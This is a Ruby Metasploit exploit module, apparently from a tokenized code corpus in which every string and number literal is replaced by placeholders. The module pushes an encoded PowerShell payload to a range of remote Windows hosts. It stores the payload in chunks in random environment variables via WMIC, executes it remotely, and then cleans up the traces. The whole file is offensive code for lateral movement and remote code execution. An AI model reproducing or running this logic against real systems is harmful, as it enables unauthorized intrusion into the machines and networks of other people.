require <str> require <str> require <str> class Metasploit3 < Msf :: Exploit :: Local Rank = ExcellentRanking include Msf :: Exploit :: Powershell include Msf :: Post :: Windows :: WMIC def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > <str> , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ [ <str> , { <str> = > [ ARCH_X86 , ARCH_X86_64 ] } ] , ] , <str> = > <int> ) ) register_options ( [ OptAddressRange . new ( <str> , [ true , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) ] ) deregister_options ( <str> ) end def exploit if datastore [ <str> ] and datastore [ <str> ] . nil? fail_with ( Failure :: BadConfig , <str> ) end Rex :: Socket :: RangeWalker . new ( datastore [ <str> ] ) . each do | server | run_host ( server ) end end def run_host ( server ) if load_extapi psh_options = { <str> = > true , <str> = > true } else psh_options = { <str> = > true , <str> = > true , <str> = > true } end psh = cmd_psh_payload ( payload . encoded , payload_instance . arch . first , psh_options ) begin if load_extapi exec_cmd = psh else print_status ( <str> server <str> ) chunks = split_code ( psh , <int> ) env_name = rand_text_alpha ( rand ( <int> ) + <int> ) env_vars = [ ] <int> . upto ( chunks . length - <int> ) do | i | env_vars << <str> env_name <str> i <str> c = <str> env_vars [ i ] <str> chunks [ i ] <str> result = wmic_command ( c , server ) unless result print_error ( <str> server <str> ) return false end end x = rand_text_alpha ( rand ( <int> ) + <int> ) exec_cmd = generate_psh_command_line ( { <str> = > true , <str> = > <str> , <str> = > <str> x <str> } ) env_vars . each do | env | exec_cmd << <str> env <str> end exec_cmd << <str> x <str> end print_status ( <str> server <str> ) result = wmic_command ( exec_cmd , server ) if result if result [ <str> ] == <int> print_good ( <str> server <str> result [ <str> ] <str> ) else print_error ( <str> server <str> result [ <str> ] <str> ) end else print_error ( <str> server <str> ) end unless load_extapi print_status ( <str> server <str> ) env_vars . each do | env | cleanup_cmd = <str> env <str> wmic_command ( cleanup_cmd , server ) end end rescue Rex :: Post :: Meterpreter :: RequestError = > e print_error ( <str> server <str> e <str> ) return false ensure Rex :: sleep ( <int> ) end end def split_code ( psh , chunk_size ) array = [ ] idx = <int> while ( idx < psh . length ) array << psh [ idx , chunk_size ] idx += chunk_size end return array end end 
